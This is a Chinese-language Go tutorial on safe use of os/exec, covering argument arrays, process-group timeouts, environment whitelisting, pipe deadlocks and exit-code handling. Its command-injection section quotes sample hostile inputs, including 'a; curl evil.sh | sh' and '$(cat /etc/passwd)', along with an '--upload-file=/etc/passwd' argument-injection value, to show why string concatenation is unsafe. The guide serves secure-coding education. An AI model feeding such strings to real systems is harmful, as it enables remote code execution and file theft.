Go 中执行外部命令的正确姿势

🏷️ Go 语言

把 Go 服务当胶水层去调外部命令，是后端绕不开的活：调 git 同步仓库、调 ffmpeg 转码、调内部 CLI 搬数据、调 iptables 改规则。标准库 os/exec 表面只有几个函数，但它的线上事故密度相当高——命令注入、管道死锁、超时杀不干净、退出码判反、环境变量泄漏，追到底几乎都是对同一件事的误解：它不经过 shell。而这些事故有一个共同点：它们全部可以由一份写对一次的封装挡掉。

💡
这篇怎么读
  • ① 用法：一份可直接抄的安全调用封装（参数走数组、用户参数放 -- 之后、Setpgid 配自定义 Cancel 按进程组先 TERM 再 KILL、WaitDelay 收尾、Env 白名单、输出限长）、退出码与超时的分类函数、启动时的 LookPath 预检，以及取输出五种方式怎么选和流式处理的三 goroutine 定式。
  • ② 原理：不经过 shell 的执行模型与所有 shell 语法的退化结果、注入为什么是被主动引入的、管道死锁的真实位置、CommandContext 只杀直接子进程、*exec.Error 与 *exec.ExitError 的区别、Env 与 PATH 的零值语义。
  • ③ 场景：哪些命令该换成纯 Go 实现、哪些该调就调的决策矩阵，以及 Windows 上参数传递与进程树终止的差异。

① 用法 · 安全调用外部命令的封装

下面这段是可以直接抄进项目的封装：参数数组、进程组隔离、超时与收尾宽限期、环境白名单、输出限长一次到位。注释只写「为什么必须这么写」，机制原因在原理层展开。

type limitedWriter struct {
    w io.Writer
    n int64 // 还允许写入的字节数
}

// 超额部分直接丢弃但仍然返回成功，这样子进程不会收到 EPIPE 提前死掉，
// 也不会让 io.Copy 报 ErrShortWrite。
func (l *limitedWriter) Write(p []byte) (int, error) {
    total := len(p)
    if l.n <= 0 {
        return total, nil
    }
    if int64(total) > l.n {
        p = p[:l.n]
    }
    n, err := l.w.Write(p)
    l.n -= int64(n)
    if err != nil {
        return n, err
    }
    return total, nil
}

func runIsolated(parent context.Context, timeout time.Duration,
    name string, args ...string) ([]byte, error) {

    ctx, cancel := context.WithTimeout(parent, timeout)
    defer cancel()

    // 参数以数组传递，全程没有字符串拼接，注入面为零。
    cmd := exec.CommandContext(ctx, name, args...)

    // Env 非 nil 是「完整替换」而不是「追加」：必须把子进程真正需要的变量列全，
    // 否则它自己再 exec 时会因为没有 PATH 而失败。
    // 反过来，保持 nil 会把父进程的全部凭据类变量交给子进程。
    cmd.Env = []string{
        "PATH=/usr/local/bin:/usr/bin:/bin",
        "LANG=C.UTF-8",
        "HOME=/tmp",
    }
    cmd.Dir = "/srv/workdir"

    // 让子进程自成进程组，这是能够按组清理孙进程的前提。
    cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}

    // 覆盖默认 Cancel：默认实现只 Kill 直接子进程，孙进程会变孤儿。
    // 负 PID 表示「整个进程组」；先 TERM 给一次清理临时文件的机会，再补 KILL。
    // 这里返回 nil，让 Wait 报进程自身的退出状态
    cmd.Cancel = func() error {
        _ = syscall.Kill(-cmd.Process.Pid, syscall.SIGTERM)
        time.AfterFunc(2*time.Second, func() {
            _ = syscall.Kill(-cmd.Process.Pid, syscall.SIGKILL)
        })
        return nil
    }

    // 取消之后最多再给 3 秒收尾；超了就关管道并返回 ErrWaitDelay，
    // 避免孙进程攥着继承来的 fd 把 Wait 永久挂住。
    cmd.WaitDelay = 3 * time.Second

    var buf bytes.Buffer
    lw := &limitedWriter{w: &buf, n: 4 << 20} // 最多收 4 MiB
    cmd.Stdout = lw
    cmd.Stderr = lw // 同一个值，exec 会复用同一个子进程 fd

    err := cmd.Run()
    return buf.Bytes(), err
}

// 用户可控的值要做两件事才能进 args：放在 -- 之后，且拒绝以连字符开头。
// 否则 "--upload-file=/etc/passwd" 这类值会被目标程序当成选项，
// 这是不经 shell 也躲不掉的「参数注入」
func safeArgs(fixed []string, userVals ...string) ([]string, error) {
    args := append([]string{}, fixed...)
    args = append(args, "--")
    for _, v := range userVals {
        if v == "" || strings.HasPrefix(v, "-") {
            return nil, fmt.Errorf("rejected user arg %q", v)
        }
        args = append(args, v)
    }
    return args, nil
}

// 启动时预检所有依赖的外部命令并 fail-fast，
// 比等线上第一个请求才发现镜像里没装 ffmpeg 划算得多
func preflight(names ...string) error {
    for _, n := range names {
        if _, err := exec.LookPath(n); err != nil {
            return fmt.Errorf("required command %q not available: %w", n, err)
        }
    }
    return nil
}

退出码要分类，不能一律当失败。被我们超时杀掉的进程和自己崩掉的进程，err 的文本可能一模一样，唯一可靠的区分办法是先看 ctx.Err()：

func classify(ctx context.Context, err error) string {
    if err == nil {
        return "ok"
    }
    // 1) 先问 context：被我们杀掉时 err 通常只有 signal: killed，
    //    只有 ctx.Err() 能区分「超时」和「程序自己崩了」。
    if ctxErr := ctx.Err(); ctxErr != nil {
        if errors.Is(ctxErr, context.DeadlineExceeded) {
            return "timeout"
        }
        return "canceled_by_caller"
    }
    // 2) 根本没启动：LookPath 失败、目标不可执行。此时没有退出码。
    var startErr *exec.Error
    if errors.As(err, &startErr) {
        return "not_executable: " + startErr.Name
    }
    // 3) 启动了但非零退出，这才有退出码。
    var exitErr *exec.ExitError
    if errors.As(err, &exitErr) {
        if ws, ok := exitErr.Sys().(syscall.WaitStatus); ok && ws.Signaled() {
            // ExitCode() 在这种情况下是 -1，真实原因在 WaitStatus 里。
            return "signaled: " + ws.Signal().String()
        }
        // ExitError.Stderr 只有 Output() 才会填，Run() 时恒为空。
        return fmt.Sprintf("exit=%d stderr=%q",
            exitErr.ExitCode(), bytes.TrimSpace(exitErr.Stderr))
    }
    // 4) 进程退了但管道没收尾，被 WaitDelay 强关。
    if errors.Is(err, exec.ErrWaitDelay) {
        return "io_not_drained"
    }
    return "other: " + err.Error()
}

① 用法 · 取输出的五种方式与流式定式

需要向子进程流式写入、同时流式读出的场景（数据转换、压缩管道、按行处理日志），定式是三条流各有一个 goroutine，主 goroutine 只负责等它们全部结束再 Wait：

// 流式过滤：stdin 喂数据，stdout 按行回调，stderr 只留尾部。
func streamFilter(ctx context.Context, in io.Reader, onLine func(string)) error {
    cmd := exec.CommandContext(ctx, "jq", "-c", ".items[]")
    cmd.WaitDelay = 2 * time.Second

    stdin, err := cmd.StdinPipe()
    if err != nil {
        return err
    }
    stdout, err := cmd.StdoutPipe()
    if err != nil {
        return err
    }
    stderr, err := cmd.StderrPipe()
    if err != nil {
        return err
    }
    if err := cmd.Start(); err != nil {
        return err // 这里是 *exec.Error（找不到 jq），不是退出码
    }

    var g errgroup.Group
    // 1) 喂 stdin：写完必须 Close，否则子进程一直等 EOF。
    g.Go(func() error {
        defer stdin.Close()
        _, err := io.Copy(stdin, in)
        if errors.Is(err, syscall.EPIPE) {
            return nil // 子进程提前退出属正常，不当错误
        }
        return err
    })
    // 2) 读 stdout：必须与 stderr 并行，串行读就是经典死锁。
    g.Go(func() error {
        sc := bufio.NewScanner(stdout)
        // 默认单行上限 64 KiB，超了报 token too long；按业务放大。
        sc.Buffer(make([]byte, 0, 64<<10), 4<<20)
        for sc.Scan() {
            onLine(sc.Text())
        }
        return sc.Err()
    })
    // 3) 读 stderr：必须读到 EOF 把管道排空，只是把内容截断保留，
    //    千万不要用 io.LimitReader 提前停读，那等于把子进程堵死。
    var tail bytes.Buffer
    g.Go(func() error {
        _, err := io.Copy(&limitedWriter{w: &tail, n: 32 << 10}, stderr)
        return err
    })

    if err := g.Wait(); err != nil {
        _ = cmd.Wait()
        return err
    }
    // Wait 一定在所有管道读完之后调用，顺序反了会截断输出。
    if err := cmd.Wait(); err != nil {
        return fmt.Errorf("jq failed: %w (stderr: %s)", err, tail.String())
    }
    return nil
}

② 原理 · 执行模型：os/exec 不是 system()

搞清这一节，能解决最高频的一类现象：同一条命令在终端里能跑，在 Go 里报「文件不存在」。

C 的 system("ls *.txt") 实际执行的是 /bin/sh -c "ls *.txt"，分词、通配符展开、管道、重定向全由 shell 完成。os/exec 走的是另一条路：exec.Command(name, args...) 只是把程序名和参数组装成一个 argv 数组，Start 时在子进程里直接 execve，中间没有任何解释器。

这一点既是它最重要的安全属性，也是新人困惑的唯一来源：你写下的每个参数都会原封不动地成为 argv 的一个元素，不会被拆开，也不会被展开，你也不需要（更不应该）自己给它加引号。

② 原理 · 命令注入：拼字符串的那一刻就已经输了

搞清这一节，能解释用法层为什么把「参数走数组」放在第一条，以及为什么「加引号」「过滤分号」这两种补救都不成立。

因为默认不走 shell，os/exec 天生没有注入面。注入是被人主动引入的——通常长这样：

exec.Command("sh", "-c", "tar czf /tmp/out.tgz " + userPath)

一旦有了 sh -c 和字符串拼接，你就把参数边界的解释权交还给了 shell。用户传 a; curl evil.sh | sh 就是远程执行；传 $(cat /etc/passwd) 就是任意文件读取。这里要特别强调两个错误认知：

  • 「加引号就安全了」是错的。 把变量包进单引号只是把攻击面从分号换成单引号——攻击者输入一个单引号就能闭合它。手写 shell 转义在多层嵌套、换行符、locale 差异下几乎不可能做对。
  • 「过滤掉分号和竖线就安全了」也是错的。 shell 的元字符集合远不止这两个，换行、反引号、$()、&、>、大括号展开都能达成目的；黑名单永远漏。

正确的心智模型是：参数走数组，数据永远不参与命令结构的构造。 如果实在必须用 sh -c（比如确实需要管道且不想写两个 Cmd），那么脚本文本必须是写死的常量，外部数据只能通过 环境变量 或 位置参数（sh -c 'cmd "$1"' -- value）传进去，绝不进入脚本文本本身。另外别忘了参数注入：即使不经 shell，用户可控的参数如果以连字符开头，也可能被目标程序当成选项（典型是 --output、--upload-file），所以用户数据前面要加 -- 分隔符，或者校验它不以连字符开头。这类「数据被当成结构」的通用模型见 Web 安全总览：威胁建模、SSRF、上传漏洞与纵深防御。

② 原理 · 死锁的真实位置与大输出的内存账

搞清这一节，能解决「命令跑着就卡死、Wait 永不返回」和「输出莫名被截断」这两个现象。

Run、Output、CombinedOutput 的区别不只是「返不返回输出」，关键差异在谁负责读子进程的管道。这里先纠正两个很常见的说法。第一，「用 Output 时 stderr 没人读会把子进程堵死」不成立：Output 在 Stderr 为 nil 时会替你挂一个只保留首尾、总量 32 KiB 的缓冲，并由独立 goroutine 持续排空管道，这也是 ExitError.Stderr 字段数据的来源——顺带一提，这个字段只有 Output 才会填，用 Run 时它永远是空的。第二，「CombinedOutput 让两个 goroutine 并发写同一个 buffer，会数据竞争」也不成立：exec 发现 Stderr 与 Stdout 是同一个值时，会让子进程的两个 fd 指向同一个管道，父侧只有一个读者。

真正的死锁只发生在你接管管道之后。内核管道缓冲是有限的（Linux 默认 64 KiB），先把 stdout 读到 EOF 再去读 stderr，子进程就会在 stderr 的 write 上阻塞，进而不再产出 stdout，双方互等：

sequenceDiagram participant P as 父进程读取方 participant K as 内核管道缓冲 participant C as 子进程 C->>K: 往 stdout 写数据 P->>K: 读 stdout C->>K: 往 stderr 写数据 Note over K: stderr 侧缓冲被写满，没有读者 C--xK: 下一次写 stderr 阻塞在系统调用里 Note over C: 子进程卡死，stdout 不再产出 P->>K: 继续读 stdout，永远读不到 EOF Note over P: Wait 永不返回，双方互等

另一个同源的错误是先调 Wait 再读管道。Wait 会在进程回收后关闭这些管道，你后续读到的只是缓冲里的残余，看起来像「输出被截断」。文档写得很明确：管道必须全部读完之后再 Wait。

内存这件事要算清楚：Output 和 CombinedOutput 把 stdout 全量读进 bytes.Buffer，而 bytes.Buffer 扩容是成倍 append，峰值可以达到最终大小的两倍左右。子进程输出量不受你控制（比如 git log 全量、find /）时，用这两个函数就是在赌容器内存上限。要么改流式，要么把 Stdout 直接指向 *os.File 落盘——后者还有一个隐藏收益：writer 是 *os.File 时 exec 会把该 fd 直接给子进程，不创建管道、不起拷贝 goroutine，纯内核层转发。容器内存上限与 OOM 的判读见 容器的实现机制与镜像工程。

② 原理 · 取消与超时：CommandContext 只杀直接子进程

搞清这一节，能解释一个很典型的现象：超时重试时报「端口已被占用」，因为上一轮的孙进程还攥着监听 socket。

exec.CommandContext 做的事很有限：context 完成时调用 Cmd.Cancel，默认实现是给直接子进程发 Kill。如果子进程是个 shell 脚本、一个 make、或者任何会 fork 的程序，它的孩子不会收到任何信号，会变成孤儿继续跑。

stateDiagram-v2 [*] --> Built Built --> Failed: LookPath 或 clone 失败 Built --> Running: Start 成功 Running --> Exited: 子进程自行结束 Running --> Canceled: context 完成 Canceled --> Exited: 执行 Cancel，默认只 Kill 直接子进程 Canceled --> Draining: 孙进程仍持有继承来的管道 Draining --> Exited: WaitDelay 到期，强制关管道 Exited --> [*]: Wait 返回，进程被回收 Failed --> [*] Built: 已构造，未启动 Running: 运行中 Canceled: 已取消 Draining: 收尾宽限期 Exited: 已退出 Failed: 启动失败 note right of Draining 不调用 Wait 会留下僵尸进程 Wait 只能调用一次，第二次返回错误 end note
字段可用版本零值行为漏设或设错的后果
Cmd.CancelGo 1.20+CommandContext 填入「Kill 直接子进程」孙进程成孤儿，端口与临时文件不释放
Cmd.WaitDelayGo 1.20+0，表示无限等 I/O 拷贝收尾孙进程继承了管道并一直不退出，Wait 永久挂住
SysProcAttr.Setpgid类 Unixfalse，子进程留在父进程组没有进程组，无法一次性清理整棵进程树
SysProcAttr.Pdeathsig仅 Linux0，不发信号父进程被 kill -9 后，子进程还活着继续消耗资源
Cmd.ErrGo 1.20+Command 里 LookPath 失败时置位忽略它的话错误延迟到 Start 才暴露，日志上下文已丢

还有一个反复被误解的点：WaitDelay 不是执行超时。它是「取消动作发生之后（或进程已退出之后），留给标准输入输出拷贝收尾的宽限期」，超时就强制关管道并让 Wait 返回 exec.ErrWaitDelay。只设 WaitDelay 而不设 context，命令可以跑到天荒地老。两者是配合关系，不是替代关系。

② 原理 · 退出码与错误判读

搞清这一节，能解决监控告警失真：把 grep 无匹配报成故障、把超时报成崩溃、把 -1 当成业务退出码。

os/exec 的错误分两大类，混在一起处理是告警失真的主要原因：一类是没启动起来（*exec.Error，压根没有退出码），一类是启动了但非零退出（*exec.ExitError，有退出码）。

能 As/Is 出什么含义有退出码吗常见误判
*exec.Error，Is(err, exec.ErrNotFound)PATH 里找不到该程序，或文件不可执行没有当成退出码 127 上报；实际上 127 是 shell 的约定，这里没走 shell
Is(err, exec.ErrDot)程序名解析到了当前目录下的相对路径，Go 1.19 起默认拒绝没有误判成权限问题；正确做法是显式给绝对路径
*exec.ExitError跑完了，退出码非零有，ExitCode()grep 无匹配返回 1、diff 有差异返回 1，都是正常语义，不是故障
ExitError 且 WaitStatus.Signaled()被信号终止（含我们自己发的 SIGKILL）ExitCode() 返回 -1把 -1 当业务退出码写进指标
exec.ErrWaitDelay进程已退出但 I/O 拷贝没收尾，被强制关闭可能同时有报成「命令执行失败」，其实命令本身可能已经成功
ctx.Err() == context.DeadlineExceeded我们自己超时把它杀了通常同时拿到 signal: killed只看 err 文本，把超时报成「程序崩溃」

最后一行是重点：被 SIGKILL 打死的进程，Run 返回的往往只是一个 ExitError，文本是 signal: killed，光看 err 区分不出「它自己崩了」和「我们超时杀的」。可靠的判法就是用法层那个 classify：先问 ctx.Err()，再分启动失败与非零退出。

② 原理 · 环境、工作目录与 PATH 查找

这一节的坑全部来自「零值语义」——你没显式设置的字段，行为往往不是你以为的那样。

Cmd 字段零值语义踩坑点
Env = nil继承父进程全部环境变量把 DB_PASSWORD、云厂商临时凭据一并交给子进程；子进程若打印环境或崩溃转储，就是一次泄漏
Env 非 nil完整替换，不是追加忘了 PATH，子进程内部再 exec 就失败；想「继承再改」用 cmd.Environ()（Go 1.19+）取基线
Env 里有重复 key后出现的生效；Windows 上按大小写不敏感去重以为前面的生效，导致覆盖顺序反了
Dir = ""用父进程当前目录Dir 不影响 LookPath；但相对的可执行文件路径是子进程 chdir 之后解析的，两者基准不同
Stdin = nil接 os.DevNull，子进程立刻读到 EOF以为子进程会等输入；反过来，设了 StdinPipe 不 Close 则子进程永远等
Stdout = nil丢弃排查时什么都看不到，误以为程序没执行
ExtraFiles空；传入时子进程里从 fd 3 开始编号Windows 不支持；fd 编号错位会让子进程读错文件

关于 PATH 查找还有两个版本行为要记住。其一，exec.Command 只有在程序名不含路径分隔符时才调 LookPath；写成 ./tool 就跳过查找，直接交给内核，此时它相对于 Dir 解析。其二，Go 1.19 起 LookPath 拒绝把程序名解析成当前目录下的相对路径（返回 exec.ErrDot），这是为了防止在不可信目录里被同名恶意程序劫持。真要执行当前目录下的东西，自己拼 filepath.Abs。

③ 场景 · 该调还是不该调

动手之前先问一句：这个外部命令真的必须调吗？ 每一次 exec 都是一次 fork（在大堆进程里复制页表并非零成本）、一次 syscall.ForkLock 串行化、一次二进制加载，还给你的部署加了一条隐式契约——目标机必须装有某个版本的某个命令。更麻烦的是你得解析人类可读的输出，而那个格式会随版本和 locale 漂移。

场景该怎么做为什么代价
标准库能直接做的事（读目录、发 HTTP、压缩、解 JSON）用纯 Go 实现，见下面的对照表不必解析人类可读输出，部署不再依赖目标机装了什么要自己处理一些 CLI 顺手帮你做掉的细节，比如递归与符号链接
功能复杂、重写不现实的工具（ffmpeg、pandoc、LaTeX）该调就调，但必须套用法层那份封装这些工具本身就是一整套复杂实现，重写等于重做一个项目部署要保证版本一致，输出格式随版本漂移要单独兼容
只读 Git 对象、遍历历史用 go-git，见 用 Go 操作 Git 仓库：go-git 的能力与边界单二进制部署，目标机不需要装 gitgo-git 对部分 git 特性支持有限，边界情况要回落到调 git
一次性运维脚本、胶水逻辑直接写 shell 脚本，别塞进 Go 服务脚本的迭代成本远低于改服务再发版脚本的可靠性要靠自己保证，见 Shell 脚本的工程化：可靠性优先
需要管道、通配符、重定向Go 侧自己接管：filepath.Glob 展开、两个 Cmd 接管道、Stdout 指向文件不引入 shell 就不引入注入面代码比一行 shell 长，但参数边界完全可控
命令由用户配置（自定义构建步骤、插件钩子）固定可执行文件白名单，参数模板化，容器或专用账号隔离这本质上是让用户在你的机器上执行代码，只能靠隔离而不是过滤要维护白名单与沙箱环境，功能自由度被限制
高频调用（每请求都 exec 一次）改成常驻子进程加协议通信，或干脆换纯 Go 实现fork 加二进制加载的固定开销乘以 QPS 就是可观的 CPU常驻进程要自己管生命周期、健康检查与重启
要在 Windows 与类 Unix 上都跑把命令调用收进一个平台适配层，Windows 侧单独测两边的参数传递与进程终止模型根本不同，见下一节多一层抽象，且必须有两套 CI 机器才能真正验证
你想调的命令纯 Go 替代换掉的收益
ls / findos.ReadDir、filepath.WalkDir不必解析输出，路径含空格与换行也不会出错
curl / wgetnet/http超时、重试、连接复用、证书校验全部可控可观测
tar / gziparchive/tar + compress/gzip流式处理，不落临时文件，不受 GNU/BSD tar 参数差异影响
git（读对象、遍历历史）go-git单二进制部署，目标机不需要装 git
jqencoding/json + 结构体类型安全，错误能定位到字段
opensslcrypto/*不再受系统 openssl 版本与 FIPS 策略牵制
sed / awkbufio + strings / regexp行为不随 locale 和 GNU/BSD 实现漂移
ps / netstat直接读 /proc（Linux）字段稳定，不用对着列宽做切分

正则与文本处理那一侧的取舍（什么时候该用 regexp、什么时候 strings 就够）见 正则在 Go 里的性能、边界与替代。

③ 场景 · 跨平台差异与不适用边界

Windows 的进程创建模型和类 Unix 根本不同，CreateProcess 最终只接受一整条命令行字符串，Go 会按 C 运行时的规则替你把 argv 数组转义拼接回去，目标程序再自己解析。这条链路上任何一环规则不一致，参数边界就会错位。

维度类 UnixWindows
进程创建clone/fork + execve，argv 是真数组CreateProcess，最终只有一条命令行字符串
参数传递内核按数组交付，无二次解析Go 按 C 运行时规则转义，目标程序再解析一次
批处理文件无此概念.bat/.cmd 由 cmd.exe 二次解析，转义规则与 C 运行时不同，需要自己填 SysProcAttr.CmdLine
可执行判定看权限位，不要求扩展名依赖 PATHEXT，历史上还会优先搜当前目录
终止进程树Setpgid + 负 PID 发信号没有进程组信号，要用 Job Object，或退化成调 taskkill 带 /T /F
信号语义SIGTERM 优雅退出、SIGKILL 强杀只有 TerminateProcess（等价强杀）；要发 Ctrl-Break 必须先设 CREATE_NEW_PROCESS_GROUP
环境变量区分大小写不区分大小写，去重规则也因此不同

不适用边界：三种情况下不该走 os/exec。一是标准库或成熟 Go 库能直接完成的事，调命令只是给部署加了一条隐式依赖并把结构化数据降级成待解析的文本；二是每请求都要执行一次的高频路径，fork 加二进制加载的固定成本乘以 QPS 就是实打实的 CPU，该改成常驻子进程或纯 Go 实现；三是命令内容由用户提供的场景——那本质上是「让用户在你的机器上执行代码」，过滤和转义都不是答案，只能用可执行文件白名单加容器或专用账号隔离。此外，用法层那份封装里的 Setpgid 与负 PID 发信号只在类 Unix 上成立，Windows 侧必须单独实现并单独测。

回到最上面那句话：os/exec 的事故几乎全部源于「以为它是 system()」。参数走数组、进程组隔离、超时配收尾宽限期、输出限长、退出码分类——这五件事写对一次，后面所有调用都受益。

本篇在簇里的位置：这是标准库与系统交互这条线的最后一站，前面几篇处理的都是进程内部的数据与输出，这一步跨出了进程边界；下一步进入 Web 框架，讨论请求怎么进来。

最容易踩的坑

❌
避坑清单
  • 用 sh -c 拼字符串：一旦有拼接就有注入，加引号和过滤分号都挡不住。必须用 shell 时脚本文本写死，数据走环境变量或位置参数。
  • 用户可控参数以连字符开头：即使不经 shell，也会被目标程序当成选项。用户数据前加 -- 分隔，或校验首字符。
  • 串行读 StdoutPipe 和 StderrPipe：其中一路超过内核管道缓冲（Linux 默认 64 KiB）就双向死锁。两个管道必须两个 goroutine 并行读。
  • 先 Wait 再读管道：Wait 会关掉管道，表现为「输出莫名被截断」。顺序只能是读完再 Wait。
  • Start 之后忘了 Wait：子进程退出后变僵尸占着 PID 和管道 fd，长跑服务最终 fork 失败。Wait 还只能调一次。
  • 写完 StdinPipe 不 Close：子进程一直等 EOF，表现成命令「卡住不动」，直到超时才被杀掉。
  • 以为 CommandContext 会杀掉整棵进程树：默认只杀直接子进程。要 Setpgid + 自定义 Cancel 用负 PID 发信号。
  • 把 WaitDelay 当执行超时：它只是取消后的 I/O 收尾宽限期，不设 context 命令能跑到永远。
  • 设了 Env 却忘了 PATH：Env 是完整替换不是追加，子进程内部再 exec 就会失败。想继承再改用 cmd.Environ()。
  • 让 Env 保持 nil：凭据类环境变量整份交给子进程，是很典型的横向泄漏路径。
  • 把 ExitCode() 返回的 -1 当业务退出码：那代表进程是被信号打死的，真实信号在 WaitStatus 里。
  • 把非零退出一律当故障：grep 无匹配返回 1、diff 有差异返回 1 都是正常语义，要按命令约定解释。
  • 只看 err 文本判断失败原因：超时被杀和程序自己崩掉的文本可能一样，必须先问 ctx.Err()。
  • 对不受控的大输出用 Output：全量进 bytes.Buffer，扩容峰值约两倍，直接把容器 OOM 掉。改流式或直接落盘。
  • 指望 ExitError.Stderr 里有内容：只有 Output 会填这个字段，Run 和 CombinedOutput 都不会。
  • 不做启动预检：镜像里没装那个命令，错误在第一个请求时才暴露，而那时上下文最难还原。启动时 LookPath 一遍。
  • Windows 上直接调 .bat 并依赖 Go 的转义：cmd.exe 会用另一套规则重新解析，参数边界会错位，必须自己填 SysProcAttr.CmdLine。
